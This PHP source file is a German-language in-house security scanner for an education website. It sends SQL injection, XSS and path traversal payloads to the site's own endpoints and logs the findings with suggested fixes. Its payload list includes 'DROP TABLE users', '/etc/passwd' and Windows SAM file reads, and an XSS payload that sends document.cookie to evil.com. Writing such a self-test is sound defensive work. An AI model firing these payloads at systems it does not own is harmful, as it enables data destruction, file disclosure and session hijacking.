<?php
/**
 * sgiT Education - Security Bot v1.4
 * 
 * Automatisierte Sicherheitsprüfung
 * - SQL Injection Tests
 * - XSS (Cross-Site Scripting) Tests
 * - Path Traversal Tests
 * - Session Security Tests
 * - Input Validation Tests
 * 
 * @author sgiT Solution Engineering & IT Services
 * @version 1.4
 * @date 06.12.2025
 * 
 * v1.4 Änderungen:
 * - FIX: Automatische Docker-Erkennung (BUG-033)
 *   In Docker: http://nginx/ statt localhost:8080
 * 
 * v1.3 Änderungen:
 * - FIX: Live-Output für Docker/nginx/PHP-FPM (BUG-032)
 * 
 * v1.2 Änderungen:
 * - FIX: Testet adaptive_learning.php statt alte Modul-Ordner
 * 
 * v1.1 Änderungen:
 * - XSS Detection verbessert: Prüft nur noch ob der eigene Payload in der Response erscheint
 * - Behebt False Positives durch legitimes alert() im JavaScript-Code
 * - Regex-Patterns für Event-Handler und href/src Injection korrigiert
 */

require_once dirname(__DIR__) . '/bot_logger.php';
require_once dirname(__DIR__) . '/bot_output_helper.php';

class SecurityBot {
    
    private $logger;
    private $config;
    private $stopFile;
    
    // v1.4: Automatische Docker-Erkennung
    private $baseUrl;
    
    private function detectBaseUrl() {
        // In Docker: /var/www/html existiert
        if (file_exists('/var/www/html')) {
            // Innerhalb Docker-Netzwerk: nginx Service-Name verwenden
            return 'http://nginx/';
        }
        // Lokal (XAMPP/Windows): localhost mit Port
        return 'http://localhost:8080/';
    }
    
    // v1.2: Zentrale Lernseite
    private $learningPage = 'adaptive_learning.php';
    
    // Alle 15 Module
    private $modules = [
        'mathematik', 'physik', 'chemie', 'biologie', 'erdkunde',
        'geschichte', 'kunst', 'musik', 'computer', 'programmieren',
        'bitcoin', 'steuern', 'englisch', 'lesen', 'wissenschaft'
    ];
    
    // Gefundene Schwachstellen
    private $vulnerabilities = [];
    
    // Statistiken
    private $stats = [
        'tests_total' => 0,
        'tests_passed' => 0,
        'critical' => 0,
        'high' => 0,
        'medium' => 0,
        'low' => 0
    ];
    
    // Standard-Konfiguration
    private $defaultConfig = [
        'timeout' => 10,
        'testSqlInjection' => true,
        'testXss' => true,
        'testPathTraversal' => true,
        'testSession' => true,
        'verbose' => true,
        'maxPayloadsPerTest' => 5
    ];
    
    // ==========================================
    // PAYLOAD BIBLIOTHEK
    // ==========================================
    
    private $payloads = [
        'sql_injection' => [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "'; DROP TABLE users; --",
            "1' AND '1'='1",
            "1' AND SLEEP(2) --",
            "' UNION SELECT NULL --",
            "admin'--",
            "1; SELECT * FROM users",
            "' OR 1=1#",
            "1' ORDER BY 1--"
        ],
        'xss' => [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "' onmouseover='alert(1)'",
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '{{constructor.constructor("alert(1)")()}}',
            '<script>document.location="http://evil.com"</script>',
            '<img src="x" onerror="this.src=\'http://evil.com/?\'+document.cookie">'
        ],
        'path_traversal' => [
            '../config.php',
            '../../config.php',
            '../../../etc/passwd',
            '....//....//config.php',
            '..%2F..%2Fconfig.php',
            '..\\..\\windows\\system32\\config\\sam',
            '/etc/passwd',
            'file:///etc/passwd',
            '....\\....\\config.php'
        ]
    ];
    
    /**
     * Konstruktor
     */
    public function __construct($config = []) {
        // v1.4: Automatische Docker-Erkennung
        $this->baseUrl = $this->detectBaseUrl();
        
        $this->config = array_merge($this->defaultConfig, $config);
        $this->logger = new BotLogger(BotLogger::CAT_SECURITY);
        $this->stopFile = dirname(__DIR__) . '/logs/STOP_SECURITY_BOT';
    }
    
    /**
     * Hauptmethode - Führt Security-Scan durch
     */
    public function run() {
        if (file_exists($this->stopFile)) {
            unlink($this->stopFile);
        }
        
        $this->logger->startRun('Security Bot v1.1', $this->config);
        $startTime = microtime(true);
        
        $this->logger->info("═══════════════════════════════════════════════════════");
        $this->logger->info("🔒 SECURITY BOT GESTARTET");
        $this->logger->info("   Module: " . count($this->modules));
        $this->logger->info("   Tests: SQL Injection, XSS, Path Traversal, Session");
        $this->logger->info("═══════════════════════════════════════════════════════");
        
        // Phase 1: SQL Injection
        if ($this->config['testSqlInjection']) {
            $this->logger->info("");
            $this->logger->info("═══ PHASE 1: SQL Injection Tests ═══");
            $this->testSqlInjection();
        }
        
        // Phase 2: XSS
        if ($this->config['testXss']) {
            $this->logger->info("");
            $this->logger->info("═══ PHASE 2: XSS (Cross-Site Scripting) Tests ═══");
            $this->testXss();
        }
        
        // Phase 3: Path Traversal
        if ($this->config['testPathTraversal']) {
            $this->logger->info("");
            $this->logger->info("═══ PHASE 3: Path Traversal Tests ═══");
            $this->testPathTraversal();
        }
        
        // Phase 4: Session Security
        if ($this->config['testSession']) {
            $this->logger->info("");
            $this->logger->info("═══ PHASE 4: Session Security Tests ═══");
            $this->testSessionSecurity();
        }
        
        // Phase 5: Information Disclosure
        $this->logger->info("");
        $this->logger->info("═══ PHASE 5: Information Disclosure Tests ═══");
        $this->testInformationDisclosure();
        
        // Zusammenfassung
        $totalTime = round((microtime(true) - $startTime), 2);
        $this->generateSecurityReport($totalTime);
        
        $summary = sprintf(
            "Tests: %d | Critical: %d | High: %d | Medium: %d | Low: %d",
            $this->stats['tests_total'],
            $this->stats['critical'],
            $this->stats['high'],
            $this->stats['medium'],
            $this->stats['low']
        );
        
        $this->logger->endRun($summary);
        
        return [
            'stats' => $this->stats,
            'vulnerabilities' => $this->vulnerabilities
        ];
    }
    
    /**
     * SQL Injection Tests
     */
    private function testSqlInjection() {
        $payloads = array_slice($this->payloads['sql_injection'], 0, $this->config['maxPayloadsPerTest']);
        
        foreach ($this->modules as $module) {
            if ($this->shouldStop()) break;
            
            $this->logger->info("📚 [$module] Teste SQL Injection...");
            $vulnerable = false;
            
            // v1.2: Neue URL-Struktur!
            $url = $this->baseUrl . $this->learningPage . '?module=' . urlencode($module);
            
            foreach ($payloads as $payload) {
                $this->stats['tests_total']++;
                
                // Test in verschiedenen Parametern
                $testParams = ['answer', 'id', 'q', 'user', 'search'];
                
                foreach ($testParams as $param) {
                    $response = $this->sendRequest($url, [$param => $payload]);
                    
                    if ($this->detectSqlError($response)) {
                        $vulnerable = true;
                        $this->logVulnerability('SQL_INJECTION', 'CRITICAL', $module, [
                            'payload' => $payload,
                            'parameter' => $param,
                            'suggestion' => 'Verwende PDO Prepared Statements oder SQLite3::prepare()'
                        ]);
                        break 2; // Ein Fund pro Modul reicht
                    }
                }
            }
            
            if (!$vulnerable) {
                $this->stats['tests_passed']++;
                $this->logger->success("   ✅ Keine SQL Injection gefunden");
            }
        }
    }
    
    /**
     * Erkennt SQL-Fehler in Response
     */
    private function detectSqlError($response) {
        $patterns = [
            '/SQL syntax/i',
            '/mysql_fetch/i',
            '/sqlite3?_/i',
            '/ORA-\d+/i',
            '/SQLSTATE/i',
            '/Warning.*SQL/i',
            '/Unclosed quotation mark/i',
            '/quoted string not properly terminated/i',
            '/You have an error in your SQL/i',
            '/supplied argument is not a valid MySQL/i',
            '/pg_query\(\)/i',
            '/SQLITE_ERROR/i'
        ];
        
        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $response)) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * XSS Tests
     */
    private function testXss() {
        $payloads = array_slice($this->payloads['xss'], 0, $this->config['maxPayloadsPerTest']);
        
        foreach ($this->modules as $module) {
            if ($this->shouldStop()) break;
            
            $this->logger->info("📚 [$module] Teste XSS...");
            $vulnerable = false;
            
            // v1.2: Neue URL-Struktur!
            $url = $this->baseUrl . $this->learningPage . '?module=' . urlencode($module);
            
            foreach ($payloads as $payload) {
                $this->stats['tests_total']++;
                
                $response = $this->sendRequest($url, ['answer' => $payload]);
                
                // Prüfe ob Payload ungefiltert zurückkommt
                if ($this->detectXssVulnerable($response, $payload)) {
                    $vulnerable = true;
                    $this->logVulnerability('XSS', 'CRITICAL', $module, [
                        'payload' => $payload,
                        'type' => 'Reflected XSS',
                        'suggestion' => 'Verwende htmlspecialchars($input, ENT_QUOTES, "UTF-8") für alle Ausgaben'
                    ]);
                    break; // Ein Fund pro Modul reicht
                }
            }
            
            if (!$vulnerable) {
                $this->stats['tests_passed']++;
                $this->logger->success("   ✅ Keine XSS-Schwachstelle gefunden");
            }
        }
    }
    
    /**
     * Prüft ob XSS-Payload durchkommt
     * 
     * v1.1: Verbesserte Detection - prüft NUR ob der eigene Payload
     *       ungefiltert in der Response erscheint.
     *       Vorher: False Positives durch legitimes alert() im JS-Code
     */
    private function detectXssVulnerable($response, $payload) {
        // Prüfe ob der EXAKTE Payload ungefiltert zurückkommt
        if (strpos($response, $payload) !== false) {
            return true;
        }
        
        // Prüfe auch HTML-encoded Version (schwächere Filterung)
        // z.B. wenn nur < > gefiltert werden aber nicht komplett escaped
        $partialEncoded = str_replace(['<', '>'], ['&lt;', '&gt;'], $payload);
        if ($partialEncoded !== $payload && strpos($response, $partialEncoded) !== false) {
            // Nur warnen wenn es als ausführbar erkannt wird
            // (z.B. in onclick-Attributen)
            return false; // Teilweise encoded ist OK
        }
        
        // Prüfe ob Payload in Event-Handler injiziert wurde
        // z.B. onclick="[PAYLOAD]" - das wäre gefährlich
        $escapedPayload = preg_quote($payload, '/');
        if (preg_match('/on\w+=["\'][^"\']*' . $escapedPayload . '/i', $response)) {
            return true;
        }
        
        // Prüfe ob Payload in href/src injiziert wurde
        // z.B. href="javascript:[PAYLOAD]"
        if (preg_match('/(href|src)=["\'][^"\']*' . $escapedPayload . '/i', $response)) {
            return true;
        }
        
        return false;
    }
    
    /**
     * Path Traversal Tests
     */
    private function testPathTraversal() {
        $payloads = array_slice($this->payloads['path_traversal'], 0, $this->config['maxPayloadsPerTest']);
        
        // Teste verschiedene Endpunkte
        $endpoints = [
            $this->baseUrl . 'AI/data/',
            $this->baseUrl . 'includes/',
            $this->baseUrl . 'bots/logs/'
        ];
        
        foreach ($endpoints as $baseEndpoint) {
            if ($this->shouldStop()) break;
            
            $this->logger->info("🔍 Teste Path Traversal: $baseEndpoint");
            
            foreach ($payloads as $payload) {
                $this->stats['tests_total']++;
                
                // Direkt als URL
                $url = $baseEndpoint . $payload;
                $response = $this->sendRequest($url);
                
                if ($this->detectSensitiveData($response)) {
                    $this->logVulnerability('PATH_TRAVERSAL', 'CRITICAL', 'system', [
                        'url' => $url,
                        'payload' => $payload,
                        'suggestion' => 'Validiere Dateipfade mit realpath() und basename()'
                    ]);
                }
                
                // Als Parameter
                foreach ($this->modules as $module) {
                    $moduleUrl = $this->baseUrl . $module . '/index.php';
                    $response = $this->sendRequest($moduleUrl, ['file' => $payload, 'path' => $payload]);
                    
                    if ($this->detectSensitiveData($response)) {
                        $this->logVulnerability('PATH_TRAVERSAL', 'CRITICAL', $module, [
                            'payload' => $payload,
                            'suggestion' => 'Niemals User-Input direkt in Dateipfade einbauen'
                        ]);
                    }
                }
            }
        }
        
        $this->stats['tests_passed']++;
        $this->logger->success("   ✅ Path Traversal Tests abgeschlossen");
    }
    
    /**
     * Erkennt sensible Daten
     */
    private function detectSensitiveData($response) {
        $patterns = [
            '/root:.*:0:0/i',  // /etc/passwd
            '/\[boot loader\]/i',  // Windows boot.ini
            '/\$db_password\s*=/i',  // DB-Passwort
            '/define\s*\(\s*[\'"]DB_PASSWORD[\'"]/i',  // WordPress-Style
            '/mysql_connect/i',  // Alte MySQL-Verbindung
            '/sqlite3?:\/\//i',  // SQLite-Pfad
            '/<\?php/i'  // PHP-Code (wenn nicht erwartet)
        ];
        
        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $response)) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Session Security Tests
     */
    private function testSessionSecurity() {
        $this->stats['tests_total']++;
        
        // Sammle mehrere Session-IDs
        $sessions = [];
        for ($i = 0; $i < 5; $i++) {
            $response = $this->sendRequest($this->baseUrl, [], true);
            $sessionId = $this->extractSessionId($response);
            if ($sessionId) {
                $sessions[] = $sessionId;
            }
        }
        
        // Test 1: Session-ID Länge
        if (!empty($sessions)) {
            $avgLength = array_sum(array_map('strlen', $sessions)) / count($sessions);
            
            if ($avgLength < 20) {
                $this->logVulnerability('WEAK_SESSION', 'HIGH', 'system', [
                    'length' => $avgLength,
                    'suggestion' => 'Verwende längere Session-IDs (mindestens 32 Zeichen)'
                ]);
            } else {
                $this->logger->success("   ✅ Session-ID Länge OK ($avgLength Zeichen)");
            }
            
            // Test 2: Entropie prüfen
            $uniqueChars = count(array_unique(str_split($sessions[0])));
            if ($uniqueChars < 10) {
                $this->logVulnerability('LOW_ENTROPY_SESSION', 'MEDIUM', 'system', [
                    'unique_chars' => $uniqueChars,
                    'suggestion' => 'Verwende session.entropy_file und session.entropy_length'
                ]);
            }
        }
        
        // Test 3: HttpOnly Cookie
        $this->testHttpOnlyCookie();
        
        $this->stats['tests_passed']++;
    }
    
    /**
     * Extrahiert Session-ID aus Response
     */
    private function extractSessionId($response) {
        if (preg_match('/PHPSESSID=([a-zA-Z0-9]+)/i', $response, $matches)) {
            return $matches[1];
        }
        return null;
    }
    
    /**
     * Testet HttpOnly Cookie Flag
     */
    private function testHttpOnlyCookie() {
        $this->stats['tests_total']++;
        
        $ch = curl_init($this->baseUrl);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true
        ]);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        // Prüfe Set-Cookie Header
        if (preg_match('/Set-Cookie:.*PHPSESSID/i', $response)) {
            if (!preg_match('/Set-Cookie:.*HttpOnly/i', $response)) {
                $this->logVulnerability('MISSING_HTTPONLY', 'MEDIUM', 'system', [
                    'suggestion' => 'Setze session.cookie_httponly = 1 in php.ini'
                ]);
            } else {
                $this->logger->success("   ✅ HttpOnly Cookie Flag gesetzt");
                $this->stats['tests_passed']++;
            }
        }
    }
    
    /**
     * Information Disclosure Tests
     */
    private function testInformationDisclosure() {
        $patterns = [
            'password' => '/password\s*[:=]\s*["\'][^"\']+["\']/i',
            'api_key' => '/api[_-]?key\s*[:=]\s*["\'][^"\']+["\']/i',
            'secret' => '/secret\s*[:=]\s*["\'][^"\']+["\']/i',
            'debug' => '/debug\s*=\s*true/i',
            'phpinfo' => '/phpinfo\(\)/i',
            'stack_trace' => '/stack trace|fatal error|exception/i',
            'db_credentials' => '/db_(user|pass|host|name)\s*=/i'
        ];
        
        foreach ($this->modules as $module) {
            if ($this->shouldStop()) break;
            
            $this->stats['tests_total']++;
            // v1.2: Neue URL-Struktur!
            $url = $this->baseUrl . $this->learningPage . '?module=' . urlencode($module);
            $response = $this->sendRequest($url);
            
            $found = false;
            foreach ($patterns as $name => $pattern) {
                if (preg_match($pattern, $response)) {
                    $found = true;
                    $this->logVulnerability('INFO_DISCLOSURE', 'MEDIUM', $module, [
                        'type' => $name,
                        'suggestion' => 'Entferne Debug-Ausgaben und sensible Daten aus Responses'
                    ]);
                }
            }
            
            if (!$found) {
                $this->stats['tests_passed']++;
            }
        }
        
        $this->logger->success("   ✅ Information Disclosure Tests abgeschlossen");
    }
    
    /**
     * Loggt eine Sicherheitslücke
     */
    private function logVulnerability($type, $severity, $module, $details) {
        $this->vulnerabilities[] = [
            'type' => $type,
            'severity' => $severity,
            'module' => $module,
            'details' => $details,
            'timestamp' => date('Y-m-d H:i:s')
        ];
        
        // Statistik aktualisieren
        $severityLower = strtolower($severity);
        if (isset($this->stats[$severityLower])) {
            $this->stats[$severityLower]++;
        }
        
        // Icon basierend auf Severity
        $icons = [
            'CRITICAL' => '🔴',
            'HIGH' => '🟠',
            'MEDIUM' => '🟡',
            'LOW' => '🟢'
        ];
        $icon = $icons[$severity] ?? '⚪';
        
        $this->logger->log(
            $severity === 'CRITICAL' ? 'critical' : ($severity === 'HIGH' ? 'error' : 'warning'),
            "   $icon [$severity] $type in $module",
            [
                'module' => $module,
                'test' => $type,
                'details' => $details,
                'suggestion' => $details['suggestion'] ?? null
            ]
        );
        
        // Als Verbesserungsvorschlag speichern
        $this->logger->suggestion(
            "$type Schwachstelle in $module",
            $details['suggestion'] ?? 'Sicherheitslücke beheben',
            [
                'priority' => $severityLower,
                'category' => 'security',
                'files' => [$module . '/index.php']
            ]
        );
    }
    
    /**
     * Generiert Security-Report
     */
    private function generateSecurityReport($totalTime) {
        $this->logger->info("");
        $this->logger->info("═══════════════════════════════════════════════════════");
        $this->logger->info("🔒 SECURITY REPORT");
        $this->logger->info("═══════════════════════════════════════════════════════");
        $this->logger->info("   Tests durchgeführt: {$this->stats['tests_total']}");
        $this->logger->info("   Tests bestanden:    {$this->stats['tests_passed']}");
        $this->logger->info("");
        
        if ($this->stats['critical'] > 0) {
            $this->logger->critical("   🔴 CRITICAL: {$this->stats['critical']}");
        }
        if ($this->stats['high'] > 0) {
            $this->logger->error("   🟠 HIGH:     {$this->stats['high']}");
        }
        if ($this->stats['medium'] > 0) {
            $this->logger->warning("   🟡 MEDIUM:   {$this->stats['medium']}");
        }
        if ($this->stats['low'] > 0) {
            $this->logger->info("   🟢 LOW:      {$this->stats['low']}");
        }
        
        $totalVulns = $this->stats['critical'] + $this->stats['high'] + $this->stats['medium'] + $this->stats['low'];
        
        if ($totalVulns === 0) {
            $this->logger->success("   ✅ Keine Schwachstellen gefunden!");
        } else {
            $this->logger->info("");
            $this->logger->info("   📋 Top-Prioritäten:");
            
            // Zeige die kritischsten Schwachstellen
            $criticals = array_filter($this->vulnerabilities, function($v) {
                return $v['severity'] === 'CRITICAL';
            });
            
            $count = 0;
            foreach ($criticals as $vuln) {
                if ($count >= 3) break;
                $this->logger->info("      " . ($count + 1) . ". {$vuln['type']} in {$vuln['module']}");
                $count++;
            }
        }
        
        $this->logger->info("");
        $this->logger->info("   ⏱️ Laufzeit: {$totalTime}s");
        $this->logger->info("═══════════════════════════════════════════════════════");
        
        // Metriken speichern
        $this->logger->metric('vulnerabilities_total', $totalVulns, 'count');
        $this->logger->metric('critical_count', $this->stats['critical'], 'count');
        $this->logger->metric('scan_time', $totalTime, 's');
    }
    
    /**
     * HTTP-Request senden
     */
    private function sendRequest($url, $postData = [], $getHeaders = false) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => $this->config['timeout'],
            CURLOPT_HEADER => $getHeaders,
            CURLOPT_USERAGENT => 'sgiT SecurityBot/1.0'
        ]);
        
        if (!empty($postData)) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        }
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        return $response ?: '';
    }
    
    /**
     * Prüft ob Bot gestoppt werden soll
     */
    private function shouldStop() {
        return file_exists($this->stopFile) || connection_aborted();
    }
    
    /**
     * Stoppt den Bot
     */
    public static function stop() {
        $stopFile = dirname(__DIR__) . '/logs/STOP_SECURITY_BOT';
        file_put_contents($stopFile, date('Y-m-d H:i:s'));
        return true;
    }
    
    /**
     * Quick Scan - Nur kritische Tests
     */
    public function quickScan() {
        $this->config['maxPayloadsPerTest'] = 2;
        $this->config['testSession'] = false;
        return $this->run();
    }
}

// ============================================================
// STANDALONE AUSFÜHRUNG MIT UI
// ============================================================
if (basename($_SERVER['PHP_SELF']) == basename(__FILE__)) {
    
    set_time_limit(600); // 10 Minuten max
    
    if (isset($_GET['stop'])) {
        SecurityBot::stop();
        header('Location: ' . $_SERVER['PHP_SELF'] . '?stopped=1');
        exit;
    }
    
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <title>🔒 Security Bot - sgiT Education</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(135deg, #1A3503, #2d5a06); 
            padding: 20px; 
            min-height: 100vh;
            margin: 0;
        }
        .container { 
            max-width: 900px; 
            margin: 0 auto; 
            background: white; 
            border-radius: 20px; 
            padding: 40px; 
            box-shadow: 0 20px 60px rgba(0,0,0,0.3); 
        }
        h1 { 
            color: #1A3503; 
            border-bottom: 3px solid #dc3545; 
            padding-bottom: 15px; 
        }
        .badge {
            display: inline-block;
            background: #dc3545;
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 14px;
            margin-left: 10px;
        }
        .warning-box {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .info-box {
            background: #e7f3ff;
            border: 1px solid #b6d4fe;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }
        button {
            background: #dc3545;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            margin-right: 10px;
            margin-bottom: 10px;
        }
        button:hover { background: #c82333; }
        button.secondary { background: #6c757d; }
        button.stop { background: #343a40; }
        .log-output {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 12px;
            max-height: 500px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
        .vuln-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-top: 20px;
        }
        .vuln-box {
            border-radius: 8px;
            padding: 15px;
            text-align: center;
            color: white;
        }
        .vuln-box.critical { background: #dc3545; }
        .vuln-box.high { background: #fd7e14; }
        .vuln-box.medium { background: #ffc107; color: #333; }
        .vuln-box.low { background: #28a745; }
        .vuln-box .number { font-size: 32px; font-weight: bold; }
        .vuln-box .label { font-size: 12px; }
    </style>
</head>
<body>
<div class="container">
    <h1>🔒 Security Bot <span class="badge">v1.4</span></h1>
    
    <div class="warning-box">
        <strong>⚠️ Hinweis:</strong> Dieser Bot testet auf Sicherheitslücken. 
        Nur auf eigenen Systemen verwenden!
    </div>
    
    <div class="info-box">
        <h4>🔍 Was wird getestet?</h4>
        <ul>
            <li>💉 <strong>SQL Injection</strong> - Datenbank-Angriffe</li>
            <li>📜 <strong>XSS</strong> - Cross-Site Scripting</li>
            <li>📁 <strong>Path Traversal</strong> - Dateizugriff</li>
            <li>🔑 <strong>Session Security</strong> - Token-Sicherheit</li>
            <li>📢 <strong>Information Disclosure</strong> - Datenlecks</li>
        </ul>
    </div>
    
    <form method="post">
        <button type="submit" name="run_full">🔍 Vollständiger Scan</button>
        <button type="submit" name="run_quick" class="secondary">⚡ Quick Scan</button>
        <a href="?stop=1"><button type="button" class="stop">⏹️ Stoppen</button></a>
        <a href="../bot_summary.php"><button type="button" class="secondary">📊 Dashboard</button></a>
    </form>
    
    <?php
    if (isset($_POST['run_full']) || isset($_POST['run_quick'])) {
        echo '<div style="margin-top: 30px;">';
        echo '<h3>🔄 Scan läuft...</h3>';
        echo '<div class="log-output" id="live-log">';
        
        // Docker/nginx/PHP-FPM Live-Output Fix
        BotOutputHelper::init();
        
        $bot = new SecurityBot();
        
        if (isset($_POST['run_quick'])) {
            $results = $bot->quickScan();
        } else {
            $results = $bot->run();
        }
        
        echo '</div>';
        
        // Vulnerability-Karten
        $stats = $results['stats'];
        echo '<div class="vuln-grid">';
        echo '<div class="vuln-box critical"><div class="number">' . $stats['critical'] . '</div><div class="label">CRITICAL</div></div>';
        echo '<div class="vuln-box high"><div class="number">' . $stats['high'] . '</div><div class="label">HIGH</div></div>';
        echo '<div class="vuln-box medium"><div class="number">' . $stats['medium'] . '</div><div class="label">MEDIUM</div></div>';
        echo '<div class="vuln-box low"><div class="number">' . $stats['low'] . '</div><div class="label">LOW</div></div>';
        echo '</div>';
        
        echo '</div>';
    }
    ?>
    
</div>
</body>
</html>
<?php 
}

// CLI-Modus
if (php_sapi_name() === 'cli') {
    $options = getopt('', ['quick', 'help']);
    
    if (isset($options['help'])) {
        echo "\nSecurity Bot - Sicherheits-Scan\n";
        echo "================================\n\n";
        echo "Optionen:\n";
        echo "  --quick   Schneller Scan (weniger Payloads)\n\n";
        exit(0);
    }
    
    $bot = new SecurityBot();
    
    if (isset($options['quick'])) {
        $results = $bot->quickScan();
    } else {
        $results = $bot->run();
    }
    
    echo "\n\nGefundene Schwachstellen: " . count($results['vulnerabilities']) . "\n";
}
?>
